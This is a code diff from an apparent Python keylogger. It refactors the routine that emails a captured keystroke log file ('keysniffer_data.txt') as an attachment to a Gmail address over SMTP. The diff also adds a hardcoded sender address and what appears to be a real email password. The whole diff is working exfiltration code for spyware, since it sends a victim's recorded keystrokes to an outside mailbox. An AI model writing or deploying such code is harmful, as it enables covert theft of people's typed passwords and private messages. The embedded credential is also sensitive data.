@@ -39,60 +39,62 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 
+import getpass
+from requests import get
 
-fromaddr = "7unkym0nk3y@gmail.com"
+
+
+
+email_address = "7unkym0nk3y@gmail.com" # Enter disposable email here
+password = "test..123" # Enter email password here
+
+username = getpass.getuser()
+
 toaddr = "7unkym0nk3y@gmail.com"
+keys_information = "keysniffer_data.txt"
+file_path = "C:\Users\Cyb3r_Tyr\Documents"
+extend = "\\"
+file_merge = file_path + extend
 
-# instance of MIMEMultipart
-msg = MIMEMultipart()
+def send_email(filename, attachment, toaddr):
 
-# storing the senders email address
-msg["From"] = fromaddr
+    fromaddr = "7unkym0nk3y@gmail.com"
 
-# storing the receivers email address
-msg["To"] = toaddr
+    msg = MIMEMultipart()
 
-# storing the subject
-msg["Subject"] = "test"
+    msg['From'] = fromaddr
 
-# string to store the body of the mail
-body = "Body_of_the_mail"
+    msg['To'] = toaddr
 
-# attach the body with the msg instance
-msg.attach(MIMEText(body, "plain"))
+    msg['Subject'] = "Log File"
 
-# open the file to be sent
-filename = "keysniffer_data.txt"
-attachment = open("keysniffer_data.txt", "rb")
+    body = "Body_of_the_mail"
 
-# instance of MIMEBase and named as p
-p = MIMEBase("application", "octet-stream")
+    msg.attach(MIMEText(body, 'plain'))
 
-# To change the payload into encoded form
-p.set_payload((attachment).read())
+    filename = filename
+    attachment = open(attachment, 'rb')
 
-# encode into base64
-encoders.encode_base64(p)
+    p = MIMEBase('application', 'octet-stream')
 
-p.add_header("Content-Disposition", "attachment; filename= %s" % filename)
+    p.set_payload((attachment).read())
 
-# attach the instance 'p' to instance 'msg'
-msg.attach(p)
+    encoders.encode_base64(p)
 
-# creates SMTP session
-s = smtplib.SMTP("smtp.gmail.com", 587)
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 
-# start TLS for security
-s.starttls()
+    msg.attach(p)
 
-# Authentication
-s.login(fromaddr, "test..123")
+    s = smtplib.SMTP('smtp.gmail.com', 587)
 
-# Converts the Multipart msg into a string
-text = msg.as_string()
+    s.starttls()
 
-# sending the mail
-s.sendmail(fromaddr, toaddr, text)
+    s.login(fromaddr, password)
 
-# terminating the session
-s.quit()
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
